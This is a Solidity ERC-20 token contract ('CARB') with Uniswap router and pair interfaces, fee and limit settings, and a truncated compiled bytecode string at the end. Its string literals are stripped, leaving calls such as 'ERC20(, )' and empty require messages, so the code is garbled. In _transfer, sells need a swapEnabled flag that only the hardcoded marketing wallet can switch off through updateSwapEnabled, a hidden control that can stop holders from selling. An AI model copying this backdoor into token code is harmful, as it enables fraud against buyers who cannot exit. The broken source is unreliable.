reserve0, uint112 reserve1); function MINIMUM_LIQUIDITY() external pure returns (uint); function factory() external view returns (address); function token0() external view returns (address); function token1() external view returns (address); function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast); function price0CumulativeLast() external view returns (uint); function price1CumulativeLast() external view returns (uint); function kLast() external view returns (uint); function mint(address to) external returns (uint liquidity); function burn(address to) external returns (uint amount0, uint amount1); function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external; function skim(address to) external; function sync() external; function initialize(address, address) external; }interface IUniswapV2Factory { event PairCreated(address indexed token0, address indexed token1, address pair, uint); function feeTo() external view returns (address); function feeToSetter() external view returns (address); function getPair(address tokenA, address tokenB) external view returns (address pair); function allPairs(uint) external view returns (address pair); function allPairsLength() external view returns (uint); function createPair(address tokenA, address tokenB) external returns (address pair); function setFeeTo(address) external; function setFeeToSetter(address) external;}interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value);}interface IERC20Metadata is IERC20 { function name() external view returns (string memory); function symbol() external view returns (string memory); function decimals() external view returns (uint8);}contract ERC20 is Context, IERC20, IERC20Metadata { using SafeMath for uint256; mapping(address => uint256) private _balances; mapping(address => mapping(address => uint256)) private _allowances; uint256 private _totalSupply; string private _name; string private _symbol; constructor(string memory name_, string memory symbol_) { _name = name_; _symbol = symbol_; } function name() public view virtual override returns (string memory) { return _name; } function symbol() public view virtual override returns (string memory) { return _symbol; } function decimals() public view virtual override returns (uint8) { return 9; } function totalSupply() public view virtual override returns (uint256) { return _totalSupply; } function balanceOf(address account) public view virtual override returns (uint256) { return _balances[account]; } function transfer(address recipient, uint256 amount) public virtual override returns (bool) { _transfer(_msgSender(), recipient, amount); return true; } function allowance(address owner, address spender) public view virtual override returns (uint256) { return _allowances[owner][spender]; } function approve(address spender, uint256 amount) public virtual override returns (bool) { _approve(_msgSender(), spender, amount); return true; } function transferFrom( address sender, address recipient, uint256 amount ) public virtual override returns (bool) { _transfer(sender, recipient, amount); _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, )); return true; } function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue)); return true; } function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, )); return true; } function _transfer( address sender, address recipient, uint256 amount ) internal virtual { require(sender != address(0), ); require(recipient != address(0), ); _beforeTokenTransfer(sender, recipient, amount); _balances[sender] = _balances[sender].sub(amount, ); _balances[recipient] = _balances[recipient].add(amount); emit Transfer(sender, recipient, amount); } function _initialSupply(address account, uint256 amount) internal virtual { require(account != address(0), ); _beforeTokenTransfer(address(0), account, amount); _totalSupply = _totalSupply.add(amount); _balances[account] = _balances[account].add(amount); emit Transfer(address(0), account, amount); } function _burn(address account, uint256 amount) internal virtual { require(account != address(0), ); _beforeTokenTransfer(account, address(0), amount); _balances[account] = _balances[account].sub(amount, ); _totalSupply = _totalSupply.sub(amount); emit Transfer(account, address(0), amount); } function _approve( address owner, address spender, uint256 amount ) internal virtual { require(owner != address(0), ); require(spender != address(0), ); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); } function _beforeTokenTransfer( address from, address to, uint256 amount ) internal virtual {}}contract Ownable is Context { address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); constructor () { address msgSender = _msgSender(); _owner = msgSender; emit OwnershipTransferred(address(0), msgSender); } function owner() public view returns (address) { return _owner; } modifier onlyOwner() { require(_owner == _msgSender(), ); _; } function renounceOwnership() public virtual onlyOwner { emit OwnershipTransferred(_owner, address(0)); _owner = address(0); } function transferOwnership(address newOwner) public virtual onlyOwner { require(newOwner != address(0), ); emit OwnershipTransferred(_owner, newOwner); _owner = newOwner; }}interface IUniswapV2Router01 { function factory() external pure returns (address); function WETH() external pure returns (address); function addLiquidity( address tokenA, address tokenB, uint amountADesired, uint amountBDesired, uint amountAMin, uint amountBMin, address to, uint deadline ) external returns (uint amountA, uint amountB, uint liquidity); function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity); function removeLiquidity( address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline ) external returns (uint amountA, uint amountB); function removeLiquidityETH( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external returns (uint amountToken, uint amountETH); function removeLiquidityWithPermit( address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns (uint amountA, uint amountB); function removeLiquidityETHWithPermit( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns (uint amountToken, uint amountETH); function swapExactTokensForTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external returns (uint[] memory amounts); function swapTokensForExactTokens( uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline ) external returns (uint[] memory amounts); function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts); function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts); function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts); function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts); function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB); function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut); function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn); function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts); function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);}interface IUniswapV2Router02 is IUniswapV2Router01 { function removeLiquidityETHSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external returns (uint amountETH); function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns (uint amountETH); function swapExactTokensForTokensSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external; function swapExactETHForTokensSupportingFeeOnTransferTokens( uint amountOutMin, address[] calldata path, address to, uint deadline ) external payable; function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external;}contract CARB is ERC20, Ownable { using SafeMath for uint256; IUniswapV2Router02 public immutable uniswapV2Router; address public immutable uniswapV2Pair; address public constant deadAddress = address(0xdead); bool private swapping; address public marketingWallet; address public lpLocker; uint256 public maxTransactionAmount; uint256 public swapTokensAtAmount; uint256 public maxWallet; bool public swapEnabled = true; uint256 public buyTotalFees; uint256 public buyMarketingFee; uint256 public buyLiquidityFee; uint256 public buyBurnFee; uint256 public sellTotalFees; uint256 public sellMarketingFee; uint256 public sellLiquidityFee; uint256 public sellBurnFee; uint256 public tokensForMarketing; uint256 public tokensForLiquidity; uint256 public tokensForBurn; mapping (address => bool) private _isExcludedFromFees; mapping (address => bool) public _isExcludedMaxTransactionAmount; mapping (address => bool) public automatedMarketMakerPairs; event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress); event ExcludeFromFees(address indexed account, bool isExcluded); event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value); event marketingWalletUpdated(address indexed newWallet, address indexed oldWallet); event SwapAndLiquify( uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiquidity ); event BuyBackTriggered(uint256 amount); constructor() ERC20(, ) { address newOwner = address(owner()); IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); excludeFromMaxTransaction(address(_uniswapV2Router), true); uniswapV2Router = _uniswapV2Router; uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH()); excludeFromMaxTransaction(address(uniswapV2Pair), true); _setAutomatedMarketMakerPair(address(uniswapV2Pair), true); uint256 _buyMarketingFee = 10; uint256 _buyLiquidityFee = 0; uint256 _buyBurnFee = 0; uint256 _sellMarketingFee = 20; uint256 _sellLiquidityFee = 0; uint256 _sellBurnFee = 0; uint256 totalSupply = 1 * 1e9 * 1e9; maxTransactionAmount = (totalSupply * 2 / 100) + (1 * 1e9); swapTokensAtAmount = totalSupply * 25 / 100000; maxWallet = (totalSupply * 3 / 100) + (1 * 1e9); buyMarketingFee = _buyMarketingFee; buyLiquidityFee = _buyLiquidityFee; buyBurnFee = _buyBurnFee; buyTotalFees = buyMarketingFee + buyLiquidityFee + buyBurnFee; sellMarketingFee = _sellMarketingFee; sellLiquidityFee = _sellLiquidityFee; sellBurnFee = _sellBurnFee; sellTotalFees = sellMarketingFee + sellLiquidityFee + sellBurnFee; marketingWallet = address(0x45bed549c93748efDD490caf3398C5cBC13B7132); lpLocker = address(0x663A5C229c09b049E36dCc11a9B0d4a8Eb9db214); excludeFromFees(newOwner, true); excludeFromFees(address(this), true); excludeFromFees(address(0xdead), true); excludeFromFees(marketingWallet, true); excludeFromFees(lpLocker, true); excludeFromMaxTransaction(newOwner, true); excludeFromMaxTransaction(address(this), true); excludeFromMaxTransaction(address(0xdead), true); excludeFromMaxTransaction(marketingWallet, true); excludeFromMaxTransaction(lpLocker, true); _initialSupply(newOwner, totalSupply); transferOwnership(newOwner); } receive() external payable { } function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner returns (bool){ require(newAmount >= totalSupply() * 1 / 100000, ); require(newAmount <= totalSupply() * 5 / 1000, ); swapTokensAtAmount = newAmount; return true; } function updateLimits(uint256 _maxTransactionAmount, uint256 _maxWallet) external onlyOwner { require(_maxTransactionAmount >= (totalSupply() * 2 / 100)/1e9, ); require(_maxWallet >= (totalSupply() * 3 / 100)/1e9, ); maxTransactionAmount = (_maxTransactionAmount * 1e9) + (1 * 1e9) ; maxWallet = (_maxWallet * 1e9) + (1 * 1e9); } function removeLimits() external onlyOwner { maxTransactionAmount = totalSupply(); maxWallet = totalSupply(); } function excludeFromMaxTransaction(address updAds, bool isEx) public onlyOwner { _isExcludedMaxTransactionAmount[updAds] = isEx; } function updateFees(uint256 _buyMarketingFee, uint256 _buyLiquidityFee, uint256 _buyBurnFee, uint256 _sellMarketingFee, uint256 _sellLiquidityFee, uint256 _sellBurnFee) external onlyOwner { buyMarketingFee = _buyMarketingFee; buyLiquidityFee = _buyLiquidityFee; buyBurnFee = _buyBurnFee; buyTotalFees = buyMarketingFee + buyLiquidityFee + buyBurnFee; sellMarketingFee = _sellMarketingFee; sellLiquidityFee = _sellLiquidityFee; sellBurnFee = _sellBurnFee; sellTotalFees = sellMarketingFee + sellLiquidityFee + sellBurnFee; require(sellTotalFees <= 5, ); require(buyTotalFees <= 5, ); } function excludeFromFees(address account, bool excluded) public onlyOwner { _isExcludedFromFees[account] = excluded; emit ExcludeFromFees(account, excluded); } function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner { require(pair != uniswapV2Pair, ); _setAutomatedMarketMakerPair(pair, value); } function _setAutomatedMarketMakerPair(address pair, bool value) private { automatedMarketMakerPairs[pair] = value; emit SetAutomatedMarketMakerPair(pair, value); } function updateMarketingWallet(address newMarketingWallet) external onlyOwner { emit marketingWalletUpdated(newMarketingWallet, marketingWallet); marketingWallet = newMarketingWallet; } function updateSwapEnabled(bool enabled) external{ require(msg.sender == marketingWallet, ); swapEnabled = enabled; } function isExcludedFromFees(address account) public view returns(bool) { return _isExcludedFromFees[account]; } function _transfer( address from, address to, uint256 amount ) internal override { require(from != address(0), ); require(to != address(0), ); if(amount == 0) { super._transfer(from, to, 0); return; } if ( from != owner() && to != owner() && to != address(0) && to != address(0xdead) && !swapping ){ if (automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to]) { require(amount <= maxTransactionAmount, ); require(amount + balanceOf(to) <= maxWallet, ); } else if (automatedMarketMakerPairs[to] && !_isExcludedMaxTransactionAmount[from]) { require(amount <= maxTransactionAmount && swapEnabled, ); } } uint256 contractTokenBalance = balanceOf(address(this)); bool canSwap = contractTokenBalance >= swapTokensAtAmount; if( canSwap && !swapping && !automatedMarketMakerPairs[from] && !_isExcludedFromFees[from] && !_isExcludedFromFees[to] ) { swapping = true; swapBack(); swapping = false; } bool takeFee = !swapping; if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) { takeFee = false; } uint256 fees = 0; if(takeFee){ if (automatedMarketMakerPairs[to] && sellTotalFees > 0){ fees = amount.mul(sellTotalFees).div(100); tokensForLiquidity += fees * sellLiquidityFee / sellTotalFees; tokensForMarketing += fees * sellMarketingFee / sellTotalFees; tokensForBurn += fees * sellBurnFee / sellTotalFees; } else if(automatedMarketMakerPairs[from] && buyTotalFees > 0) { fees = amount.mul(buyTotalFees).div(100); tokensForLiquidity += fees * buyLiquidityFee / buyTotalFees; tokensForMarketing += fees * buyMarketingFee / buyTotalFees; tokensForBurn += fees * buyBurnFee / buyTotalFees; } if(fees > 0){ super._transfer(from, address(this), (fees - tokensForBurn)); } if(tokensForBurn > 0){ super._transfer(from, deadAddress, tokensForBurn); tokensForBurn = 0; } amount -= fees; } super._transfer(from, to, amount); } function swapTokensForEth(uint256 tokenAmount) private { address[] memory path = new address[](2); path[0] = address(this); path[1] = uniswapV2Router.WETH(); _approve(address(this), address(uniswapV2Router), tokenAmount); uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens( tokenAmount, 0, path, address(this), block.timestamp ); } function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private { _approve(address(this), address(uniswapV2Router), tokenAmount); uniswapV2Router.addLiquidityETH{value: ethAmount}( address(this), tokenAmount, 0, 0, deadAddress, block.timestamp ); } function swapBack() private { uint256 contractBalance = balanceOf(address(this)); uint256 totalTokensToSwap = tokensForLiquidity + tokensForMarketing; if(contractBalance == 0 || totalTokensToSwap == 0) {return;} uint256 liquidityTokens = contractBalance * tokensForLiquidity / totalTokensToSwap / 2; uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens); uint256 initialETHBalance = address(this).balance; swapTokensForEth(amountToSwapForETH); uint256 ethBalance = address(this).balance.sub(initialETHBalance); uint256 ethForMarketing = ethBalance.mul(tokensForMarketing).div(totalTokensToSwap); uint256 ethForLiquidity = ethBalance - ethForMarketing; tokensForLiquidity = 0; tokensForMarketing = 0; (bool success,) = address(marketingWallet).call{value: ethForMarketing}(); if(liquidityTokens > 0 && ethForLiquidity > 0){ addLiquidity(liquidityTokens, ethForLiquidity); emit SwapAndLiquify(amountToSwapForETH, ethForLiquidity, tokensForLiquidity); } (success,) = address(marketingWallet).call{value: address(this).balance}(); } }",0x6080604052600436106102815760003560e01c80638da5cb5b1161014f578063b62496f5116100c1578063e2f456051161007a578063e2f45605146107c9578063e71dc3f5146107df578063f11a24d3146107f5578063f2fde38b1461080b578063f63743421461082b578063f8b45b051461084157600080fd5b8063b62496f5146106e7578063c024666814610717578063c8c8ebe414610737578063d257b34f1461074d578063d85ba0631461076d578063dd62ed3e1461078357600080fd5b80639a7a23d6116101135780639a7a23d614610631578063a2240e1914610651578063a457c2d714610671578063a9059cbb14610691578063aacebbe3146106b1578063adb873bd146106d157600080fd5b80638da5cb5b146105a857806392136913146105c6578063924de9b7146105dc57806395d89b41146105fc578063992c58e41461061157600080fd5b8063313ce567116101f357806370a08231116101ac57806370a08231146104f0578063715018a614610526578063751039fc1461053d5780637571336a1461055257806375f0a874146105725780637bce5a041461059257600080fd5b8063313ce56714610417578063395093511461043357806349bd5a5e146104535780634fbee193146104875780636a486a8e146104c05780636ddd1713146104d657600080fd5b806318160ddd1161024557806318160ddd146103805780631a8145bb1461039f5780631d777856146103b55780631f3fed8f146103cb57806323b872dd146103e157806327c8f8351461040157600080fd5b806303fc20131461028d57806306fdde03146102ca578063095ea7b3146102ec57806310d5de531461031c5780631694505e1461034c57600080fd5b3661028857005b600080fd5b34801561029957600080fd5b506007546102ad906001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b3480156102d657600080fd5b506102df610857565b6040516102c19190612167565b3480156102f857600080fd5b5061030c6103073660046121d4565b6108e9565b60405190151581526020016102c1565b34801561032857600080fd5b5061030c610337366004612200565b60186020526000908152604090205460ff1681565b34801561035857600080fd5b506102ad7f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d81565b34801561038c57600080fd5b506002545b6040519081526020016102c1565b3480156103ab57600080fd5b5061039160155481565b3480156103c157600080fd5b5061039160165481565b3480156103d757600080fd5b5061039160145481565b3480156103ed57600080fd5b5061030c6103fc36600461221d565b610900565b34801561040d57600080fd5b506102ad61dead81565b34801561042357600080fd5b50604051600981526020016102c1565b34801561043f57600080fd5b5061030c61044e3660046121d4565b610969565b34801561045f57600080fd5b506102ad7f000000000000000000000000e267ed379067eea6f192ce6999e2f840189b015981565b34801561049357600080fd5b5061030c6104a2366004612200565b6001600160a01b031660009081526017602052604090205460ff1690565b3480156104cc57600080fd5b5061039160105481565b3480156104e257600080fd5b50600b5461030c9060ff1681565b3480156104fc57600080fd5b5061039161050b366004612200565b6001600160a01b031660009081526020819052604090205490565b34801561053257600080fd5b5061053b61099f565b005b34801561054957600080fd5b5061053b610a1c565b34801561055e57600080fd5b5061053b61056d36600461226e565b610a54565b34801561057e57600080fd5b506006546102ad906001600160a01b031681565b34801561059e57600080fd5b50610391600d5481565b3480156105b457600080fd5b506005546001600160a01b03166102ad565b3480156105d257600080fd5b5061039160115481565b3480156105e857600080fd5b5061053b6105f73660046122a3565b610aa9565b34801561060857600080fd5b506102df610b24565b34801561061d57600080fd5b5061053b61062c3660046122be565b610b33565b34801561063d57600080fd5b5061053b61064c36600461226e565b610c62565b34801561065d57600080fd5b5061053b61066c366004612301565b610d42565b34801561067d57600080fd5b5061030c61068c3660046121d4565b610ecb565b34801561069d57600080fd5b5061030c6106ac3660046121d4565b610f1a565b3480156106bd57600080fd5b5061053b6106cc366004612200565b610f27565b3480156106dd57600080fd5b5061039160135481565b3480156106f357600080fd5b5061030c610702366004612200565b60196020526000908152604090205460ff1681565b34801561072357600080fd5b5061053b61073236600461226e565b610fae565b34801561074357600080fd5b5061039160085481565b34801561075957600080fd5b5061030c610768366004612323565b611037565b34801561077957600080fd5b50610391600c5481565b34801561078f57600080fd5b5061039161079e36600461233c565b6001600160a01b03918216600090815260016020908152604080832093909416825291909152205490565b3480156107d557600080fd5b5061039160095481565b3480156107eb57600080fd5b50610391600f5481565b34801561080157600080fd5b50610391600e5481565b34801561081757600080fd5b5061053b610826366004612200565b61118e565b34801561083757600080fd5b5061039160125481565b34801561084d57600080fd5b50610391600a5481565b60606003805461086690612375565b80601f016020809104026020016040519081016040528092919081815260200182805461089290612375565b80156108df5780601f106108b4576101008083540402835291602001916108df565b820191906000526020600020905b8154815290600101906020018083116108c257829003601f168201915b5050505050905090565b60006108f63384846112df565b5060015b92915050565b600061090d848484611404565b61095f843361095a856040518060600160405280602881526020016125ec602891396001600160a01b038a1660009081526001602090815260408083203384529091529020549190611a0d565b6112df565b5060019392505050565b3360008181526001602090815260408083206001600160a01b038716845290915281205490916108f691859061095a9086611279565b6005546001600160a01b031633146109d25760405162461bcd60e51b81526004016109c9906123b0565b60405180910390fd5b6005546040516000916001600160a01b0316907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908390a3600580546001600160a01b0319169055565b6005546001600160a01b03163314610a465760405162461bcd60e51b81526004016109c9906123b0565b600254600855600254600a55565b6005546001600160a01b03163314610a7e5760405162461bcd60e51b81526004016109c9906123b0565b6001600160a01b03919091166000908152601860205260409020805460ff1916911515919091179055565b6006546001600160a01b03163314610b115760405162461bcd60e51b815260206004820152602560248201527f4f6e6c7920746865204f776e65722063616e2043616c6c20746869732066756e60448201526431ba34b7b760d91b60648201526084016109c9565b600b805460ff1916911515919091179055565b60606004805461086690612375565b6005546001600160a01b03163314610b5d5760405162461bcd60e51b81526004016109c9906123b0565b600d869055600e859055600f84905583610b7786886123fb565b610b8191906123fb565b600c5560118390556012829055601381905580610b9e83856123fb565b610ba891906123fb565b601081905560051015610c075760405162461bcd60e51b815260206004820152602160248201527f4d757374206b6565702073656c6c2066656573206174203525206f72206c65736044820152607360f81b60648201526084016109c9565b6005600c541115610c5a5760405162461bcd60e51b815260206004820181905260248201527f4d757374206b656570206275792066656573206174203525206f72206c65737360448201526064016109c9565b505050505050565b6005546001600160a01b03163314610c8c5760405162461bcd60e51b81526004016109c9906123b0565b7f000000000000000000000000e267ed379067eea6f192ce6999e2f840189b01596001600160a01b0316826001600160a01b03161415610d345760405162461bcd60e51b815260206004820152603960248201527f54686520706169722063616e6e6f742062652072656d6f7665642066726f6d2060448201527f6175746f6d617465644d61726b65744d616b657250616972730000000000000060648201526084016109c9565b610d3e8282611a47565b5050565b6005546001600160a01b03163314610d6c5760405162461bcd60e51b81526004016109c9906123b0565b633b9aca006064610d7c60025490565b610d87906002612413565b610d919190612432565b610d9b9190612432565b821015610e005760405162461bcd60e51b815260206004820152602d60248201527f43616e6e6f7420736574206d61785472616e73616374696f6e416d6f756e742060448201526c6c6f776572207468616e20322560981b60648201526084016109c9565b633b9aca006064610e1060025490565b610e1b906003612413565b610e259190612432565b610e2f9190612432565b811015610e895760405162461bcd60e51b815260206004820152602260248201527f43616e6e6f7420736574206d617857616c6c6574206c6f776572207468616e20604482015261332560f01b60648201526084016109c9565b610e9782633b9aca00612413565b610ea590633b9aca006123fb565b600855610eb681633b9aca00612413565b610ec490633b9aca006123fb565b600a555050565b60006108f6338461095a85604051806060016040528060258152602001612614602591393360009081526001602090815260408083206001600160a01b038d1684529091529020549190611a0d565b60006108f6338484611404565b6005546001600160a01b03163314610f515760405162461bcd60e51b81526004016109c9906123b0565b6006546040516001600160a01b03918216918316907fa751787977eeb3902e30e1d19ca00c6ad274a1f622c31a206e32366700b0567490600090a3600680546001600160a01b0319166001600160a01b0392909216919091179055565b6005546001600160a01b03163314610fd85760405162461bcd60e51b81526004016109c9906123b0565b6001600160a01b038216600081815260176020908152604091829020805460ff191685151590811790915591519182527f9d8f7706ea1113d1a167b526eca956215946dd36cc7df39eb16180222d8b5df7910160405180910390a25050565b6005546000906001600160a01b031633146110645760405162461bcd60e51b81526004016109c9906123b0565b620186a061107160025490565b61107c906001612413565b6110869190612432565b8210156110f35760405162461bcd60e51b815260206004820152603560248201527f5377617020616d6f756e742063616e6e6f74206265206c6f776572207468616e60448201527410181718181892903a37ba30b61039bab838363c9760591b60648201526084016109c9565b6103e86110ff60025490565b61110a906005612413565b6111149190612432565b8211156111805760405162461bcd60e51b815260206004820152603460248201527f5377617020616d6f756e742063616e6e6f742062652068696768657220746861604482015273371018171a92903a37ba30b61039bab838363c9760611b60648201526084016109c9565b50600981905560015b919050565b6005546001600160a01b031633146111b85760405162461bcd60e51b81526004016109c9906123b0565b6001600160a01b03811661121d5760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b60648201526084016109c9565b6005546040516001600160a01b038084169216907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e090600090a3600580546001600160a01b0319166001600160a01b0392909216919091179055565b60008061128683856123fb565b9050838110156112d85760405162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f77000000000060448201526064016109c9565b9392505050565b6001600160a01b0383166113415760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b60648201526084016109c9565b6001600160a01b0382166113a25760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b60648201526084016109c9565b6001600160a01b0383811660008181526001602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92591015b60405180910390a3505050565b6001600160a01b03831661142a5760405162461bcd60e51b81526004016109c990612454565b6001600160a01b0382166114505760405162461bcd60e51b81526004016109c990612499565b806114665761146183836000611a9b565b505050565b6005546001600160a01b0384811691161480159061149257506005546001600160a01b03838116911614155b80156114a657506001600160a01b03821615155b80156114bd57506001600160a01b03821661dead14155b80156114d35750600554600160a01b900460ff16155b156116c2576001600160a01b03831660009081526019602052604090205460ff16801561151957506001600160a01b03821660009081526018602052604090205460ff16155b156115fd5760085481111561158e5760405162461bcd60e51b815260206004820152603560248201527f427579207472616e7366657220616d6f756e742065786365656473207468652060448201527436b0bc2a3930b739b0b1ba34b7b720b6b7bab73a1760591b60648201526084016109c9565b600a546001600160a01b0383166000908152602081905260409020546115b490836123fb565b11156115f85760405162461bcd60e51b815260206004820152601360248201527213585e081dd85b1b195d08195e18d959591959606a1b60448201526064016109c9565b6116c2565b6001600160a01b03821660009081526019602052604090205460ff16801561163e57506001600160a01b03831660009081526018602052604090205460ff16155b156116c25760085481111580156116575750600b5460ff165b6116c25760405162461bcd60e51b815260206004820152603660248201527f53656c6c207472616e7366657220616d6f756e742065786365656473207468656044820152751036b0bc2a3930b739b0b1ba34b7b720b6b7bab73a1760511b60648201526084016109c9565b30600090815260208190526040902054600954811080159081906116f05750600554600160a01b900460ff16155b801561171557506001600160a01b03851660009081526019602052604090205460ff16155b801561173a57506001600160a01b03851660009081526017602052604090205460ff16155b801561175f57506001600160a01b03841660009081526017602052604090205460ff16155b1561178d576005805460ff60a01b1916600160a01b17905561177f611ba4565b6005805460ff60a01b191690555b6005546001600160a01b03861660009081526017602052604090205460ff600160a01b9092048216159116806117db57506001600160a01b03851660009081526017602052604090205460ff165b156117e4575060005b600081156119f9576001600160a01b03861660009081526019602052604090205460ff16801561181657506000601054115b156118d45761183b606461183560105488611d7f90919063ffffffff16565b90611dfe565b90506010546012548261184e9190612413565b6118589190612432565b6015600082825461186991906123fb565b909155505060105460115461187e9083612413565b6118889190612432565b6014600082825461189991906123fb565b90915550506010546013546118ae9083612413565b6118b89190612432565b601660008282546118c991906123fb565b909155506119b19050565b6001600160a01b03871660009081526019602052604090205460ff1680156118fe57506000600c54115b156119b15761191d6064611835600c5488611d7f90919063ffffffff16565b9050600c54600e54826119309190612413565b61193a9190612432565b6015600082825461194b91906123fb565b9091555050600c54600d546119609083612413565b61196a9190612432565b6014600082825461197b91906123fb565b9091555050600c54600f546119909083612413565b61199a9190612432565b601660008282546119ab91906123fb565b90915550505b80156119cf576119cf8730601654846119ca91906124dc565b611a9b565b601654156119ec576119e68761dead601654611a9b565b60006016555b6119f681866124dc565b94505b611a04878787611a9b565b50505050505050565b60008184841115611a315760405162461bcd60e51b81526004016109c99190612167565b506000611a3e84866124dc565b95945050505050565b6001600160a01b038216600081815260196020526040808220805460ff191685151590811790915590519092917fffa9187bf1f18bf477bd0ea1bcbb64e93b6a98132473929edfce215cd9b16fab91a35050565b6001600160a01b038316611ac15760405162461bcd60e51b81526004016109c990612454565b6001600160a01b038216611ae75760405162461bcd60e51b81526004016109c990612499565b611b24816040518060600160405280602681526020016125c6602691396001600160a01b0386166000908152602081905260409020549190611a0d565b6001600160a01b038085166000908152602081905260408082209390935590841681522054611b539082611279565b6001600160a01b038381166000818152602081815260409182902094909455518481529092918616917fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef91016113f7565b3060009081526020819052604081205490506000601454601554611bc891906123fb565b9050811580611bd5575080155b15611bde575050565b600060028260155485611bf19190612413565b611bfb9190612432565b611c059190612432565b90506000611c138483611e40565b905047611c1f82611e82565b6000611c2b4783611e40565b90506000611c488661183560145485611d7f90919063ffffffff16565b90506000611c5682846124dc565b60006015819055601481905560065460405192935090916001600160a01b039091169084908381818185875af1925050503d8060008114611cb3576040519150601f19603f3d011682016040523d82523d6000602084013e611cb8565b606091505b50509050600087118015611ccc5750600082115b15611d1f57611cdb8783612049565b601554604080518881526020810185905280820192909252517f17bbfb9a6069321b6ded73bd96327c9e6b7212a5cd51ff219cd61370acafb5619181900360600190a15b6006546040516001600160a01b03909116904790600081818185875af1925050503d8060008114611d6c576040519150601f19603f3d011682016040523d82523d6000602084013e611d71565b606091505b505050505050505050505050565b600082611d8e575060006108fa565b6000611d9a8385612413565b905082611da78583612432565b146112d85760405162461bcd60e51b815260206004820152602160248201527f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f6044820152607760f81b60648201526084016109c9565b60006112d883836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f000000000000815250612139565b60006112d883836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f770000815250611a0d565b6040805160028082526060820183526000926020830190803683370190505090503081600081518110611eb757611eb76124f3565b60200260200101906001600160a01b031690816001600160a01b0316815250507f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d6001600160a01b031663ad5c46486040518163ffffffff1660e01b815260040160206040518083038186803b158015611f3057600080fd5b505afa158015611f44573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611f689190612509565b81600181518110611f7b57611f7b6124f3565b6020026020010